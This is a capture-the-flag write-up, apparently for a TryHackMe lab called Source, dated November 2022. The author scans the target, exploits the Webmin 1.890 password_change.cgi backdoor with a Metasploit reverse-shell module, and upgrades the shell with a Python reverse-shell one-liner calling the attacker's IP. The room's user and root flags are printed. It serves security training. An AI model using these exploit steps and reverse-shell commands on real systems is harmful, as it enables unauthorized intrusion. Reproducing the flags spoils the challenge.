# Source

Laurent Chauvin | November 06, 2022

## Resources

[1] https://www.revshells.com/

## Progress

```
export IP=10.10.202.195
```

Nmap scan
```
nmap -sC -sV -oN nmap/initial $IP 

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-06 20:03 EST
Nmap scan report for 10.10.231.56
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.29 seconds
```

Gobuster scan
```
gobuster dir -k -u https://$IP:10000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --timeout 40s -x cgi --exclude-length 3727| tee gobuster.log
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.202.195:10000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          3727
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              cgi
[+] Timeout:                 40s
===============================================================
2022/11/06 21:27:12 Starting gobuster in directory enumeration mode
===============================================================
```

Nikto scan
```
nikto -h "https://$IP:10000" | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.231.56
+ Target Hostname:    10.10.231.56
+ Target Port:        10000
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /O=Webmin Webserver on source/CN=*/emailAddress=root@source
                   Ciphers:  TLS_AES_256_GCM_SHA384
                   Issuer:   /O=Webmin Webserver on source/CN=*/emailAddress=root@source
+ Start Time:         2022-11-06 20:07:30 (GMT-5)
---------------------------------------------------------------------------
+ Server: MiniServ/1.890
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'auth-type' found, with contents: auth-required=1
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie redirect created without the secure flag
+ Cookie redirect created without the httponly flag
+ Cookie testing created without the httponly flag
+ ERROR: Error limit (20) reached for host, giving up. Last error: Total transaction timed out
+ Scan terminated:  19 error(s) and 8 item(s) reported on remote host
+ End Time:           2022-11-06 20:29:08 (GMT-5) (1298 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

'robots.txt' show
```
User-agent: *
Disallow: /
```
We can see a 'webmin' login page (which seems to run version 1.890 from nmap).

Testing 'admin:admin' : Nothing.

As the challenge is talking about a recent vuln (and the challenge was published in 2020), let's check for exploits:

```
msfconsole
```

Then
```
msf6 > search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   3  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   4  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   5  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
```

It seems a backdoor has been introduced in 2019. Let's try it.

```
msf6 exploit(linux/http/webmin_backdoor) > show options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      10000            yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)
```

After configuration we have
```
msf6 exploit(linux/http/webmin_backdoor) > show options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.202.195    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      10000            yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.18.23.136     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)
```

Then, let's run it
```
exploit
```

And we get a shell. We find the home directory of ```dark``` which contain the user flag
```
cat /home/dark/user.txt

THM{SUPPLY_CHAIN_COMPROMISE}
```

Time to privesc.

First, let's get a better shell by starting pwncat and connecting from remote
```
cd /opt/pwncat
poetry shell
pwncat-cs -lp 9999
```

Using [1] we get the following to initiate the reverse shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.23.136",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

I started checking our ```sudo``` privileges
```
(remote) root@source:/usr/share/webmin/# sudo -l
Matching Defaults entries for root on source:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on source:
    (ALL : ALL) ALL
```

But then I realized we were already root
```
(remote) root@source:/usr/share/webmin/# whoami

root
```

Just get the flag then
```
cat /root/root.txt

THM{UPDATE_YOUR_INSTALL}
```
## Flag

1. User

```
THM{SUPPLY_CHAIN_COMPROMISE}
```

2. Privesc

```
THM{UPDATE_YOUR_INSTALL}
```

## To Go Further

Quite a lot of troubles with this VM, that was particularly slow (couldn't even run the gobuster scan as it was timeout most of the time).

More can be found here about how the backdoor has been included in the webmin code: https://www.webmin.com/exploit.html
